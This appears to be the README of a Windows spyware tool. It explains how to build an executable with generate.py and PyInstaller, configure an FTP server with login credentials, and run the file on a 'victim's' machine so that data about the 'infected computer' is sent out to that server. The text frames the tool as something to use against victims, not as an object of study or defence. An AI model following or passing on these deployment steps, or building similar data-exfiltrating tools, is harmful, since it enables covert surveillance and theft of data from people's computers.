This program collects data about a computer on which it is running and sends it to the specified FTP server.

● To start using it, you must first generate ".exe" file. 
To do this, run the file "generate.py" and specify the necessary parameters. 
(You will need to specify an address of the FTP server to which data about an infected computer will be sent. 
You also need to specify authorization data on your server: login and password.)

After that, the file generation process starts using Pyinstaller. When this process is complete, in the 
'dist' folder a new executable file will be located.

● The resulting executable file must be run on a "victim"'s machine.

[!] Building of the ".exe" file must be done on a Windows computer.
